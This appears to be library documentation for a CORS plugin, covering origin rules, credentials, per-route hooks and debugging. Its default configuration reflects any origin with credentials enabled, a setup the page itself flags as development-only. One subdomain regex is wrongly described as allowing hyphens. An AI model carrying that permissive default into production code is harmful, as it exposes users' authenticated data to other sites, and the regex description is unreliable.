- 🛡️ **Browsers**: Block the response from reaching JavaScript if CORS headers don't allow it
- 🔓 **Non-browser clients** (cURL, Postman, mobile apps): Not affected by CORS at all

By default, web browsers enforce the **Same-Origin Policy**, which blocks web pages from making requests to a different domain than the one serving the page. While this protects users, it also prevents legitimate cross-domain API calls.

For example:
- Your web app is served from `https://myapp.com`
- Your API is hosted at `https://api.myapp.com`
- Without CORS, the browser will block requests from the web app to the API

CORS allows servers to specify which origins (domains) are permitted to access their resources. Here's the flow:

1. **Simple Requests**: For basic GET/POST requests, the browser sends an `Origin` header
2. **Preflight Requests**: For complex requests (custom headers, PUT/DELETE, etc.), the browser first sends an OPTIONS request
3. **Server Response**: The server ALWAYS responds with data + CORS headers
4. **Browser Decision**: The browser either gives the response to JavaScript OR blocks it

Imagine you're building a weather app:
- Frontend: `https://coolweather.app` (your React/Vue/Angular app)
- Backend: `https://api.weather-service.com` (your API)

When a user visits your frontend and it tries to fetch weather data:

```javascript
// This code runs in the browser at https://coolweather.app
fetch('https://api.weather-service.com/forecast')
  .then(res => res.json())
  .then(data => console.log(data));
```

Without CORS headers from the API:
```
✅ API receives the request and sends response
❌ Browser blocks JavaScript from reading the response
❌ Console error: "CORS policy: No 'Access-Control-Allow-Origin' header"
❌ User sees no weather data
🔍 Network tab shows the full response (but JS can't access it)
```

With CORS headers from the API:
```
✅ API receives the request and sends response
✅ API includes: Access-Control-Allow-Origin: https://coolweather.app
✅ Browser allows JavaScript to read the response
✅ User sees weather data
```

**CORS does NOT protect your API from:**
- Direct requests (cURL, Postman, scripts)
- Mobile apps
- Backend-to-backend communication
- Malicious users with browser dev tools
- Web scraping tools

**CORS ONLY protects:**
- Users from having their credentials used by malicious websites
- Browser-based JavaScript from reading responses it shouldn't

**Therefore:** CORS is about protecting users, not protecting your API. You still need:
- Authentication (API keys, tokens)
- Authorization (user permissions)
- Rate limiting
- Input validation

## Basic Setup

The CORS plugin automatically handles preflight requests and adds appropriate headers to all responses.

The basic CORS setup creates a permissive configuration suitable for development:

**What it ALLOWS:**
- ✅ Requests from ANY origin (website, mobile app, Postman, etc.)
- ✅ All standard HTTP methods (GET, POST, PUT, PATCH, DELETE)
- ✅ Credentials (cookies, authorization headers) to be sent
- ✅ Common request headers (Content-Type, Authorization, etc.)
- ✅ Browser to cache preflight responses for 24 hours

**What it BLOCKS:**
- ❌ Nothing - this is the most permissive setup
- ⚠️ This is why it's only recommended for development

**Important Security Note:**
The combination of `origin: '*'` (wildcard) and `credentials: true` is actually invalid according to CORS specification. When credentials are enabled, browsers require a specific origin. The CORS plugin handles this by dynamically setting the origin to match the request.

### Complete Example

Here's a complete API setup with CORS enabled with the most permissive setup:

```javascript
import { Api } from 'hooked-api';
import { RestApiPlugin } from './plugins/core/rest-api-plugin.js';
import { RestApiKnexPlugin } from './plugins/core/rest-api-knex-plugin.js';
import { ExpressPlugin } from './plugins/core/connectors/express-plugin.js';
import { CorsPlugin } from './plugins/core/rest-api-cors-plugin.js';
import express from 'express';
import knex from 'knex';

// Create API instance
const api = new Api({ name: 'my-api' });

// Set up database
const db = knex({
  client: 'sqlite3',
  connection: { filename: ':memory:' },
  useNullAsDefault: true
});

// Install plugins
await api.use(RestApiPlugin);
await api.use(RestApiKnexPlugin, { knex: db });
await api.use(ExpressPlugin, { app: express() });
await api.use(CorsPlugin);

// Add a resource
await api.addScope('articles', {
  restApi: {
    schema: {
      attributes: {
        title: { type: 'string', required: true },
        content: { type: 'string' }
      }
    }
  }
});

// Mount Express routes
const app = express();
api.http.express.mount(app);
app.listen(3000).on('error', (err) => {
  console.error('Failed to start server:', err);
  process.exit(1)
});
```

### The default setup in detail

When you use the basic setup:
```javascript
await api.use(CorsPlugin);
```

It's equivalent to writing:
```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: '*',
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
    allowedHeaders: [
      'Content-Type',
      'Authorization', 
      'X-Requested-With',
      'X-HTTP-Method-Override',
      'Accept',
      'Origin'
    ],
    exposedHeaders: [
      'X-Total-Count',
      'X-Page-Count', 
      'Link',
      'Location'
    ],
    maxAge: 86400,
    optionsSuccessStatus: 204
  }
});
```

#### `origin: '*'` - Who Can Access Your API
- `'*'` means "any origin" - any website can call your API
- In practice, when `credentials: true`, the plugin dynamically sets this to the requesting origin
- Think of it as saying "I trust everyone" - fine for development, dangerous for production

#### `credentials: true` - Cookies and Authentication
- Allows browsers to send cookies and authorization headers with requests
- Essential for APIs that use cookie-based sessions or need authentication
- Forces the origin to be specific (not wildcard) in responses

#### `methods: [...]` - What Actions Are Allowed
- Lists HTTP methods clients can use
- `GET`: Read data (fetch users, articles, etc.)
- `POST`: Create new resources
- `PUT`: Replace entire resources
- `PATCH`: Update parts of resources
- `DELETE`: Remove resources
- `OPTIONS`: Preflight requests (browser asks "what can I do?")

#### `allowedHeaders: [...]` - What Headers Clients Can Send
- `Content-Type`: Specifies data format (application/json, etc.)
- `Authorization`: For Bearer tokens, API keys
- `X-Requested-With`: Often used to identify AJAX requests
- `X-HTTP-Method-Override`: Allows method override for limited clients
- `Accept`: What response formats the client wants
- `Origin`: Where the request is coming from

#### `exposedHeaders: [...]` - What Headers Clients Can Read
- By default, browsers only let JavaScript read basic headers
- `X-Total-Count`: Total number of items (for pagination)
- `X-Page-Count`: Total number of pages
- `Link`: Pagination links (next, prev, first, last)
- `Location`: Where a newly created resource can be found

#### `maxAge: 86400` - Preflight Cache Duration
- Browsers can cache preflight responses for 86400 seconds (24 hours)
- Reduces preflight requests, improving performance
- During development, you might want this lower (3600 = 1 hour)

#### `optionsSuccessStatus: 204` - Preflight Response Code
- `204 No Content` is the standard for successful OPTIONS
- Tells the browser "yes, you can make this request" without sending body data

## Configuration Options

The CORS plugin accepts various configuration options.

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `origin` | String, RegExp, Array, Function | `'*'` | Allowed origins |
| `credentials` | Boolean | `true` | Allow credentials |
| `methods` | Array | `['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS']` | Allowed HTTP methods |
| `allowedHeaders` | Array | `['Content-Type', 'Authorization', 'X-Requested-With', 'X-HTTP-Method-Override', 'Accept', 'Origin']` | Headers clients can send |
| `exposedHeaders` | Array | `['X-Total-Count', 'X-Page-Count', 'Link', 'Location']` | Headers exposed to clients |
| `maxAge` | Number | `86400` | Preflight cache duration (seconds) |
| `optionsSuccessStatus` | Number | `204` | Status code for successful OPTIONS |

### Configuration Examples

### Understanding Each Configuration Example

Each example below shows different ways to configure CORS for specific scenarios. We'll explain what each does, why you'd use it, and provide real-world context.

#### Specific Origin

**What it does:** Restricts API access to a single, specific domain.

**Real-world scenario:** You have a production API that should only be accessed by your official web application.

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: 'https://app.example.com',
    credentials: true
  }
});
```

**How it works:**
- Only requests from `https://app.example.com` will be allowed
- Requests from `https://example.com` (no subdomain) will be BLOCKED
- Requests from `http://app.example.com` (HTTP, not HTTPS) will be BLOCKED
- The browser will receive: `Access-Control-Allow-Origin: https://app.example.com`

**Example scenario:**
Your company's dashboard at `https://dashboard.mycompany.com` needs to access the API at `https://api.mycompany.com`. No other domains should have access.

```javascript
// API configuration
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: 'https://dashboard.mycompany.com',
    credentials: true // Allow cookies for user sessions
  }
});
```

#### Multiple Origins

**What it does:** Allows access from a specific list of domains.

**Real-world scenario:** You have multiple legitimate frontends (main app, admin panel, mobile web) that need API access.

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: ['https://app.example.com', 'https://admin.example.com'],
    credentials: true
  }
});
```

**How it works:**
- The plugin checks if the request's origin is in the array
- Only exact matches are allowed
- For each allowed origin, the response includes that specific origin

**Example scenario:**
Your SaaS platform has multiple interfaces:

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: [
      'https://app.mysaas.com',      // Main application
      'https://admin.mysaas.com',    // Admin dashboard
      'https://mobile.mysaas.com',   // Mobile web version
      'https://staging.mysaas.com'   // Staging environment
    ],
    credentials: true
  }
});
```

**What happens:**
- Request from `https://app.mysaas.com` → Allowed, gets `Access-Control-Allow-Origin: https://app.mysaas.com`
- Request from `https://blog.mysaas.com` → BLOCKED (not in the list)
- Request from `https://app.mysaas.com:3000` → BLOCKED (port must match exactly)

#### Pattern Matching with RegExp

**What it does:** Uses regular expressions to match origins dynamically.

**Real-world scenario:** You want to allow all subdomains of your main domain, or have a dynamic pattern for customer-specific domains.

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: /^https:\/\/.*\.example\.com$/,
    credentials: true
  }
});
```

**How it works:**
- The RegExp `/^https:\/\/.*\.example\.com$/` matches:
  - `^https:\/\/` - Must start with `https://`
  - `.*` - Any characters (subdomain)
  - `\.example\.com$` - Must end with `.example.com`

**What it matches:**
- ✅ `https://app.example.com`
- ✅ `https://staging.example.com`
- ✅ `https://customer1.example.com`
- ✅ `https://api.v2.example.com` (multiple subdomains)
- ❌ `https://example.com` (no subdomain)
- ❌ `http://app.example.com` (HTTP not HTTPS)
- ❌ `https://app.example.org` (wrong TLD)

**Real-world example:** Multi-tenant SaaS where each customer gets a subdomain:

```javascript
// Allow any customer subdomain
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: /^https:\/\/[a-z0-9-]+\.myapp\.com$/,
    credentials: true
  }
});

// This allows:
// https://acme-corp.myapp.com
// https://tech-startup.myapp.com
// https://client-123.myapp.com
```

#### Dynamic Origin Validation

**What it does:** Uses a function to determine if an origin should be allowed, enabling complex logic.

**Real-world scenario:** You need to check origins against a database, implement rate limiting, or apply business logic.

```javascript
const allowedOrigins = new Set([
  'https://app.example.com',
  'https://staging.example.com'
]);

await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: (origin) => {
      // Custom logic to determine if origin is allowed
      return allowedOrigins.has(origin) || origin.endsWith('.trusted.com');
    }
  }
});
```

**How it works:**
- The function receives the origin from each request
- Returns `true` to allow, `false` to block
- Can implement any logic: database checks, pattern matching, time-based rules

**Advanced example with database check:**

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: async (origin) => {
      // Check if origin is in our whitelist database
      const isWhitelisted = await db('cors_whitelist')
        .where({ origin, active: true })
        .first();
      
      if (isWhitelisted) return true;
      
      // Check if it's a development environment
      if (origin.includes('localhost') && process.env.NODE_ENV === 'development') {
        return true;
      }
      
      // Check if it's a partner domain
      const partner = await db('partners')
        .where('domain', origin)
        .where('api_access', true)
        .first();
      
      return !!partner;
    }
  }
});
```

**Rate limiting example:**

```javascript
const originRequestCounts = new Map();

await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: (origin) => {
      // Always allow your main domains
      if (origin === 'https://app.example.com') return true;
      
      // Rate limit other origins
      const count = originRequestCounts.get(origin) || 0;
      if (count > 1000) {
        console.warn(`Rate limit exceeded for origin: ${origin}`);
        return false;
      }
      
      originRequestCounts.set(origin, count + 1);
      return true;
    }
  }
});
```

#### Custom Headers

**What it does:** Configures which headers browsers can send to and receive from your API.

**Real-world scenario:** Your API uses custom headers for versioning, feature flags, or tracking.

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: '*',
    allowedHeaders: [
      'Content-Type',
      'Authorization',
      'X-API-Key',
      'X-Client-Version'
    ],
    exposedHeaders: [
      'X-Total-Count',
      'X-RateLimit-Limit',
      'X-RateLimit-Remaining',
      'X-Response-Time'
    ]
  }
});
```

**Understanding allowedHeaders:**
These are headers the browser is allowed to include in requests:
- `Content-Type`: Essential for JSON APIs
- `Authorization`: For Bearer tokens, Basic auth
- `X-API-Key`: Custom API key header
- `X-Client-Version`: Track client app versions

**Understanding exposedHeaders:**
By default, JavaScript can only read these response headers: Cache-Control, Content-Language, Content-Type, Expires, Last-Modified, Pragma. Your custom headers need explicit exposure:
- `X-Total-Count`: Total items for pagination
- `X-RateLimit-Limit`: Max requests allowed
- `X-RateLimit-Remaining`: Requests left
- `X-Response-Time`: Performance monitoring

**Real-world example for a versioned API:**

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: 'https://app.example.com',
    allowedHeaders: [
      'Content-Type',
      'Authorization',
      'X-Request-ID',         // For request tracking
      'X-Client-ID',          // Identify different client apps
      'X-Feature-Flags'       // Client-specific features
    ],
    exposedHeaders: [
      'X-Deprecated',         // Warn about deprecated endpoints
      'X-Request-ID',         // For debugging
      'X-Cache-Status',       // Was this cached?
      'X-Response-Time',      // Performance metrics
      'Link',                 // Pagination links
      'Warning'               // API warnings
    ]
  }
});
```

## Common Use Cases

These examples show typical CORS configurations for different scenarios you'll encounter in real projects.


### Development Environment

**Purpose:** Maximum flexibility during development, allowing requests from any origin.

**Why you need this:** During development, you might access your API from:
- `http://localhost:3000` (React dev server)
- `http://localhost:8080` (Vue dev server)  
- `http://127.0.0.1:5000` (Python Flask app)
- `http://192.168.1.100:3000` (testing on mobile via local network)
- Browser extensions, Postman, mobile apps, etc.

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: '*',
    credentials: true
  }
});
```

**What this enables:**
- ✅ Any developer can work with the API without CORS issues
- ✅ Testing tools (Postman, Insomnia) work without configuration
- ✅ Mobile app developers can test from devices/emulators
- ✅ No need to maintain a whitelist during rapid development

**Security note:** NEVER use this configuration in production. It allows any website to access your API and potentially access user data if they're logged in.

### Production with Known Clients

**Purpose:** Lock down your API to only trusted domains in production.

**Why you need this:** In production, you know exactly which domains should access your API. Restricting access prevents:
- Malicious websites from accessing your API
- Data scraping from unauthorized sources
- CSRF attacks from untrusted origins

```javascript
const isProduction = process.env.NODE_ENV === 'production';

await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: isProduction 
      ? ['https://app.mycompany.com', 'https://admin.mycompany.com']
      : '*',
    credentials: true,
    maxAge: isProduction ? 86400 : 3600
  }
});
```

**What this does:**
- **In Production:** Only `app.mycompany.com` and `admin.mycompany.com` can access the API
- **In Development:** Any origin can access (for convenience)
- **maxAge difference:** Production caches preflight for 24 hours (less requests), development for 1 hour (faster config changes)

**Real-world example with environment configs:**

```javascript
// config/cors.js
const corsConfigs = {
  development: {
    origin: '*',
    credentials: true,
    maxAge: 3600 // 1 hour
  },
  staging: {
    origin: [
      'https://staging.myapp.com',
      'https://preview.myapp.com',
      'https://qa.myapp.com'
    ],
    credentials: true,
    maxAge: 43200 // 12 hours
  },
  production: {
    origin: [
      'https://app.myapp.com',
      'https://www.myapp.com',
      'https://mobile.myapp.com'
    ],
    credentials: true,
    maxAge: 86400 // 24 hours
  }
};

await api.use(CorsPlugin, {
  'rest-api-cors': corsConfigs[process.env.NODE_ENV] || corsConfigs.development
});
```

### Public API without Credentials

**Purpose:** Create a truly public API that anyone can use, like a weather service or data API.

**Why you need this:** Public APIs typically:
- Don't use cookies or session-based auth (use API keys instead)
- Should be accessible from any website
- Need to be cached efficiently by browsers
- Often read-only (GET requests only)

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: '*',
    credentials: false,
    methods: ['GET', 'OPTIONS'],
    maxAge: 3600
  }
});
```

**Key differences from default:**
- `credentials: false` - No cookies/auth headers (allows true wildcard)
- `methods: ['GET', 'OPTIONS']` - Read-only API
- `maxAge: 3600` - Shorter cache for easier updates

**Real-world example - Public data API:**

```javascript
// Public cryptocurrency prices API
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: '*',
    credentials: false, // No user-specific data
    methods: ['GET', 'OPTIONS'], // Read-only
    allowedHeaders: [
      'Content-Type',
      'X-API-Key' // Still require API key for rate limiting
    ],
    exposedHeaders: [
      'X-RateLimit-Limit',
      'X-RateLimit-Remaining',
      'X-RateLimit-Reset',
      'X-Data-Source',
      'X-Last-Updated'
    ],
    maxAge: 300 // 5 minutes - data updates frequently
  }
});
```

**What this achieves:**
- Any website can embed your data
- No security risks from credentials
- Browsers can efficiently cache responses
- API keys still work for rate limiting

### Subdomain Wildcard

**Purpose:** Allow all subdomains of your company domain while blocking external sites.

**Why you need this:** Common in organizations where:
- Different teams have different subdomains
- Customer-specific subdomains (tenant1.app.com, tenant2.app.com)
- Environment-based subdomains (dev.app.com, staging.app.com)
- Regional subdomains (us.app.com, eu.app.com, asia.app.com)

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: /^https:\/\/([a-z0-9]+[.])*mycompany\.com$/,
    credentials: true
  }
});
```

**What the regex allows:**
- ✅ `https://mycompany.com` (main domain)
- ✅ `https://app.mycompany.com` (single subdomain)
- ✅ `https://staging.app.mycompany.com` (nested subdomains)
- ✅ `https://customer-123.mycompany.com` (with hyphens)
- ❌ `http://app.mycompany.com` (not HTTPS)
- ❌ `https://mycompany.com.evil.com` (domain suffix attack)
- ❌ `https://app.mycompany.co` (wrong TLD)

**More specific examples:**

```javascript
// Only allow specific subdomain patterns
await api.use(CorsPlugin, {
  'rest-api-cors': {
    // Only customer subdomains (customer-xxx.myapp.com)
    origin: /^https:\/\/customer-[a-z0-9]+\.myapp\.com$/,
    credentials: true
  }
});

// Allow multiple levels but require 'app' somewhere
await api.use(CorsPlugin, {
  'rest-api-cors': {
    // Matches: app.mycompany.com, staging.app.mycompany.com, app.eu.mycompany.com
    origin: /^https:\/\/(.+\.)?app(\..+)?\.mycompany\.com$/,
    credentials: true
  }
});

// Different TLDs for different regions
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: (origin) => {
      const allowedPatterns = [
        /^https:\/\/(.+\.)?mycompany\.com$/,      // .com for US
        /^https:\/\/(.+\.)?mycompany\.co\.uk$/,  // .co.uk for UK
        /^https:\/\/(.+\.)?mycompany\.de$/,       // .de for Germany
        /^https:\/\/(.+\.)?mycompany\.jp$/        // .jp for Japan
      ];
      return allowedPatterns.some(pattern => pattern.test(origin));
    },
    credentials: true
  }
});
```

## Advanced Patterns

These patterns show sophisticated CORS configurations for complex real-world scenarios.

### Why These Patterns Matter

1. **Environment-Based**: Different security requirements for dev/staging/prod
2. **Per-Route CORS**: Some endpoints need different CORS rules
3. **Authentication Integration**: CORS and auth systems must work together
4. **Base URL Support**: APIs served from subpaths need special handling

Each pattern solves specific architectural challenges you'll face in production systems.

### Environment-Based Configuration

```javascript
function getCorsConfig() {
  const env = process.env.NODE_ENV;
  
  switch (env) {
    case 'development':
      return {
        origin: '*',
        credentials: true,
        maxAge: 3600 // 1 hour cache in dev
      };
      
    case 'staging':
      return {
        origin: [
          'https://staging.example.com',
          'https://preview.example.com'
        ],
        credentials: true,
        maxAge: 43200 // 12 hours
      };
      
    case 'production':
      return {
        origin: (origin) => {
          // Allow production domains and verified partners
          const allowed = [
            'https://app.example.com',
            'https://www.example.com'
          ];
          
          const partners = getVerifiedPartnerDomains(); // Your logic
          return allowed.includes(origin) || partners.includes(origin);
        },
        credentials: true,
        maxAge: 86400 // 24 hours
      };
      
    default:
      return { origin: 'https://localhost:3000' };
  }
}

await api.use(CorsPlugin, {
  'rest-api-cors': getCorsConfig()
});
```

### Per-Route CORS (Using Hooks)

**Important Understanding:** The CORS plugin is essentially a sophisticated header management system. It:
1. Intercepts requests to check origins
2. Handles OPTIONS preflight requests
3. Adds appropriate headers to responses

Since it works with headers, you can override or extend its behavior using hooks for specific routes.

**Why You'd Need Per-Route CORS:**
- Public endpoints vs authenticated endpoints
- Different security requirements for admin routes
- Partner-specific API endpoints
- Legacy compatibility requirements

```javascript
// Add custom headers for specific routes
api.addHook('transport:response', 'custom-cors', async ({ context }) => {
  const { request, response } = context.transport;
  
  // Add extra CORS headers for admin routes
  if (request.path.startsWith('/api/admin')) {
    response.headers['Access-Control-Allow-Origin'] = 'https://admin.example.com';
    response.headers['Access-Control-Max-Age'] = '7200'; // Shorter cache for admin
  }
});
```

**What This Code Does:**
1. Hooks into the response pipeline AFTER the CORS plugin
2. Checks if the request is for an admin route
3. Overrides the CORS headers for stricter control
4. Sets a shorter cache time for admin preflight requests

**Complete Per-Route Example:**

```javascript
// Different CORS policies for different route types
api.addHook('transport:response', 'route-specific-cors', {
  order: -900 // Run after CORS plugin (which is -1000)
}, async ({ context }) => {
  const { request, response } = context.transport;
  const path = request.path;
  
  // Public data endpoints - most permissive
  if (path.startsWith('/api/public')) {
    response.headers['Access-Control-Allow-Origin'] = '*';
    delete response.headers['Access-Control-Allow-Credentials'];
  }
  
  // Admin endpoints - most restrictive  
  else if (path.startsWith('/api/admin')) {
    const adminOrigins = ['https://admin.example.com'];
    if (adminOrigins.includes(request.headers.origin)) {
      response.headers['Access-Control-Allow-Origin'] = request.headers.origin;
      response.headers['Access-Control-Allow-Credentials'] = 'true';
    } else {
      // Remove CORS headers entirely - block the request
      delete response.headers['Access-Control-Allow-Origin'];
      delete response.headers['Access-Control-Allow-Credentials'];
    }
  }
  
  // Partner endpoints - check partner status
  else if (path.startsWith('/api/partner')) {
    const partnerId = request.params.partnerId;
    const partner = await getPartner(partnerId);
    
    if (partner && partner.allowedOrigins.includes(request.headers.origin)) {
      response.headers['Access-Control-Allow-Origin'] = request.headers.origin;
      response.headers['Access-Control-Expose-Headers'] = partner.exposedHeaders.join(', ');
    }
  }
});
```

**Route-Specific OPTIONS Handling:**

You are able to add route-specific headers by adding a route using the addRoute function:

```javascript
// Custom preflight handling for specific routes
api.addRoute({
  method: 'OPTIONS',
  path: '/api/upload/*',
  handler: async ({ headers }) => {
    // Special CORS for file uploads
    return {
      statusCode: 204,
      headers: {
        'Access-Control-Allow-Origin': headers.origin,
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Content-Length, X-File-Name',
        'Access-Control-Max-Age': '300' // Only 5 minutes for upload endpoints
      }
    };
  }
});
```

However, this must happen before the CORS plugin is registered, since the order in which URLs are added will matter.

### CORS with Authentication

**The Critical Relationship Between CORS and Authentication**

CORS and authentication are deeply intertwined. When your API uses authentication, CORS configuration becomes security-critical.

**Key Concepts:**

1. **Credentials in CORS** means:
   - Cookies (session cookies, auth cookies)
   - HTTP authentication headers
   - TLS client certificates

2. **The Wildcard Restriction:**
   - When `credentials: true`, you CANNOT use `origin: '*'`
   - The browser requires an exact origin match
   - This prevents malicious sites from using user's cookies

3. **Security Implications:**
   - Wrong CORS + auth = security vulnerability
   - Attackers could make authenticated requests from their sites
   - User's cookies would be automatically included

**How Authentication Flows Work with CORS:**

1. **Login Flow:**
   ```
   1. User visits https://app.example.com
   2. App sends login request to https://api.example.com/auth/login
   3. Browser includes Origin: https://app.example.com
   4. API validates credentials
   5. API sets auth cookie with SameSite=None; Secure
   6. API responds with Access-Control-Allow-Origin: https://app.example.com
   7. API responds with Access-Control-Allow-Credentials: true
   8. Browser stores cookie for api.example.com
   ```

2. **Authenticated Request Flow:**
   ```
   1. App makes request to https://api.example.com/user/profile
   2. Browser automatically includes auth cookie
   3. Browser includes Origin: https://app.example.com
   4. API validates cookie and origin
   5. API responds with user data and CORS headers
   ```

**Common pattern for APIs with authentication:**

```javascript
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: (origin) => {
      // Always allow your known origins
      const knownOrigins = [
        'https://app.example.com',
        'https://mobile.example.com'
      ];
      
      if (knownOrigins.includes(origin)) {
        return true;
      }
      
      // For other origins, you might check against a database
      // return checkOriginInDatabase(origin);
      
      return false;
    },
    credentials: true, // Required for cookies/auth headers
    allowedHeaders: [
      'Content-Type',
      'Authorization',
      'X-CSRF-Token' // If using CSRF protection
    ],
    exposedHeaders: [
      'X-Auth-Token-Expiry',
      'X-Rate-Limit-Remaining'
    ]
  }
});
```

**Complete Authentication Example:**

```javascript
// Full setup for authenticated API
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: (origin) => {
      // Strict origin validation for authenticated endpoints
      const allowedOrigins = [
        'https://app.example.com',
        'https://mobile.example.com',
        process.env.NODE_ENV === 'development' ? 'http://localhost:3000' : null
      ].filter(Boolean);
      
      return allowedOrigins.includes(origin);
    },
    credentials: true, // MUST be true for cookies
    allowedHeaders: [
      'Content-Type',
      'Authorization',     // For Bearer tokens
      'X-CSRF-Token',     // CSRF protection
      'X-Requested-With'  // Ajax detection
    ],
    exposedHeaders: [
      'X-Auth-Expired',   // Tell client when to refresh
      'X-CSRF-Token',     // New CSRF token
      'X-User-Role'       // Client-side authorization
    ],
    maxAge: 7200 // 2 hours - balance security and performance
  }
});

// Cookie configuration (Express example)
app.use(session({
  cookie: {
    sameSite: 'none',  // Required for cross-origin
    secure: true,      // Required with sameSite=none
    httpOnly: true,    // Prevent JS access
    domain: '.example.com' // Share across subdomains
  }
}));
```

**Common Authentication Patterns:**

**Note:** These examples show CORS configuration patterns for different authentication methods. JWT generation itself is not part of this library - you'll use your own authentication service (Supabase, Auth0, Firebase Auth, etc.) or implement your own JWT generation.

1. **JWT with Cookies:**
```javascript
// Secure cookie-based JWT
api.post('/auth/login', async (req, res) => {
  // generateJWT is YOUR function - implement using Supabase, Auth0, etc.
  const token = generateJWT(user);
  res.cookie('auth-token', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'none',
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
  });
});
```

2. **Bearer Token Pattern (No CORS Credentials):**
```javascript
// When using Authorization header instead of cookies
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: '*',  // Can use wildcard without credentials
    credentials: false,  // No cookies needed
    allowedHeaders: ['Authorization', 'Content-Type']
  }
});
```

3. **Hybrid Approach:**
```javascript
// Support both cookies and bearer tokens
api.addHook('transport:request', 'auth-detector', async ({ context, request }) => {
  if (request.headers.authorization) {
    // Bearer token auth - no CORS credentials needed
    context.authType = 'bearer';
  } else if (request.headers.cookie) {
    // Cookie auth - needs CORS credentials
    context.authType = 'cookie';
  }
});
```

### CORS with Base URL

The CORS plugin works seamlessly with Express base paths.

**What Base URL Means:**

A base URL (or base path) prefixes all your API routes. Instead of:
- `/api/users`
- `/api/products`

With base path `/v1`:
- `/v1/api/users`
- `/v1/api/products`

**Why Use Base URLs:**

1. **API Versioning:** `/v1`, `/v2` for different API versions
2. **Proxy Configuration:** Nginx routes `/api` to your Node server
3. **Microservices:** Different services on different paths
4. **CDN/Load Balancer:** Route by path prefix

**How CORS Works with Base URLs:**

The CORS plugin automatically handles the base path. When you set a base path, CORS headers are applied to ALL routes under that path.

```javascript
// Express with base path
await api.use(ExpressPlugin, {
  app: express(),
  basePath: '/v1'  // API served at /v1/api/*
});

// CORS plugin handles the base path automatically
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: 'https://app.example.com'
  }
});

// Client requests to /v1/api/articles will have proper CORS headers
```

**What Happens Behind the Scenes:**

1. Express plugin registers routes with base path:
   - `/v1/api/countries`
   - `/v1/api/users`
   - etc.

2. CORS plugin registers OPTIONS handler for `/v1/*`

3. All requests under `/v1` get CORS headers

**Complete Example with Multiple APIs:**

```javascript
// Serve multiple API versions on same server
const app = express();

// API v1
const apiV1 = new Api({ name: 'my-api-v1' });
await apiV1.use(RestApiPlugin);
await apiV1.use(ExpressPlugin, { 
  app,
  basePath: '/v1' 
});
await apiV1.use(CorsPlugin, {
  'rest-api-cors': {
    origin: ['https://app.example.com', 'https://legacy.example.com']
  }
});

// API v2 with different CORS
const apiV2 = new Api({ name: 'my-api-v2' });
await apiV2.use(RestApiPlugin);
await apiV2.use(ExpressPlugin, { 
  app,
  basePath: '/v2' 
});
await apiV2.use(CorsPlugin, {
  'rest-api-cors': {
    origin: 'https://app.example.com', // v2 doesn't support legacy
    allowedHeaders: ['Content-Type', 'Authorization']
  }
});

// Mount both APIs
apiV1.http.express.mount(app);
apiV2.http.express.mount(app);

// Results:
// GET /v1/api/users - CORS allows legacy.example.com
// GET /v2/api/users - CORS blocks legacy.example.com
```

**Important Notes:**

1. CORS applies to the entire base path, not individual routes
2. You cannot have different CORS settings for routes under the same base path
3. The base path is transparent to CORS origin checks
4. Preflight OPTIONS requests work correctly with base paths

## Troubleshooting

### Common Issues and Solutions

| Issue | Cause | Solution |
|-------|-------|----------|
| "CORS header 'Access-Control-Allow-Origin' missing" | Origin not allowed | Check origin configuration, ensure it matches exactly |
| "Credentials flag is true, but Access-Control-Allow-Credentials is not 'true'" | Credentials mismatch | Ensure `credentials: true` in config |
| "Multiple CORS headers" | Multiple CORS middleware | Ensure CORS plugin is installed only once |
| Preflight fails with 404 | OPTIONS route not registered | Check that CORS plugin is installed after transport plugin |
| Wildcard origin with credentials | Security restriction | Use specific origins when `credentials: true` |

### Debug CORS Issues

Enable debug logging to troubleshoot:

```javascript
const api = new Api({ 
  name: 'my-api',
  log: { level: 'debug' }
});

// The CORS plugin will log:
// - Preflight requests received
// - Origin validation results
// - Headers being set
```

**Example Debug Output:**

```
2024-01-15T10:23:45.123Z [DEBUG] [my-api:plugin:rest-api-cors] CORS OPTIONS request { origin: 'https://app.example.com' }
2024-01-15T10:23:45.124Z [DEBUG] [my-api:plugin:rest-api-cors] CORS processing response {
  origin: 'https://app.example.com',
  method: 'POST',
  path: '/api/users'
}
2024-01-15T10:23:45.125Z [WARN] [my-api:plugin:rest-api-cors] CORS origin not allowed {
  origin: 'https://malicious-site.com',
  allowedOrigins: [ 'https://app.example.com', 'https://admin.example.com' ]
}
```

**What Each Log Means:**

1. **OPTIONS request log:**
   - Shows preflight requests as they arrive
   - Helps verify browser is sending correct preflight

2. **Processing response log:**
   - Shows CORS headers being added to regular requests
   - Confirms which origin is being processed

3. **Origin not allowed warning:**
   - Critical for security - shows blocked attempts
   - Lists what origins ARE allowed for debugging

**Debugging Specific Issues:**

```javascript
// Add custom logging for deep debugging
api.addHook('transport:response', 'cors-debug', { order: -999 }, 
  async ({ context }) => {
    const { request, response } = context.transport;
